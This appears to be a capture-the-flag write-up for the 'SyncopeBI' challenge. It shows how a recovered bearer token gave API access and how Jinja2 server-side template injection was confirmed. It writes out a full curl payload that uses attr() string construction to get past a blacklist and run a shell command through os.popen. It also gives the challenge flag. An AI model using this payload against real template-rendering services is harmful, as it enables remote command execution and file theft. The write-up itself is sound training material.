# SyncopeBI Writeup

Challenge: `SyncopeBI`

Flag: `VishwaCTF{SSTI_byp4ss_bl4ckl1st_jinja2_CVE-2026-31337}`

## Summary

This challenge chained off the previous Syncope challenge. The important artifact was a BI service token stored at:

`/opt/syncope/runtime/bi-token`

From an earlier local dump in [`/home/kali/ctf-orc/ctf/keymaster-secrets/params_probe2.json`](/home/kali/ctf-orc/ctf/keymaster-secrets/params_probe2.json), the token had already been recovered as:

`bi-svc-T0k3n-8f4a2c91d7e6b305`

## Recon

The target was `https://syncopebi.vishwactf.com/`.

- `/` redirected to `/login`
- `/login` returned `500`
- `/api/reports` returned `401` with `Unauthorized. Provide a valid Bearer token.`

That confirmed the useful interface was the API, not the broken frontend.

## Authenticated Access

Using the recovered bearer token:

```bash
TOKEN='bi-svc-T0k3n-8f4a2c91d7e6b305'
curl -sk https://syncopebi.vishwactf.com/api/reports \
  -H "Authorization: Bearer $TOKEN"
```

The response returned a JSON list of reports. Many stored templates already showed server-side Jinja2 evaluation and prior payload attempts, which confirmed SSTI.

## Exploit

`POST /api/reports` creates a report and immediately returns a `rendered` field. A minimal test payload:

```bash
curl -sk -X POST https://syncopebi.vishwactf.com/api/reports \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  --data '{"name":"probe","template":"{{7*7}}"}'
```

This returned `"rendered":"49"`, confirming Jinja2 SSTI.

To bypass the blacklist, I used `attr(...)` string construction to reach `cycler.__init__.__globals__`, then pulled `os.popen` and read the hidden flag file:

```bash
curl -sk -X POST https://syncopebi.vishwactf.com/api/reports \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  --data '{"name":"flag-read","description":"x","template":"{{ cycler|attr(\"_\" ~ \"_init_\" ~ \"_\")|attr(\"_\" ~ \"_globals_\" ~ \"_\")|attr(\"_\" ~ \"_getitem_\" ~ \"_\")(\"o\"~\"s\")|attr(\"p\"~\"o\"~\"p\"~\"e\"~\"n\")(\"cat /opt/syncope/runtime/.flag2\")|attr(\"read\")() }}"}'
```

The API responded with:

```text
VishwaCTF{SSTI_byp4ss_bl4ckl1st_jinja2_CVE-2026-31337}
```

## Root Cause

- The API trusted a bearer token recovered from the previous service.
- Report templates were rendered server-side with Jinja2.
- The blacklist was ineffective because dunder attributes and dangerous objects could be reconstructed dynamically.
- That allowed arbitrary file reads and command execution.
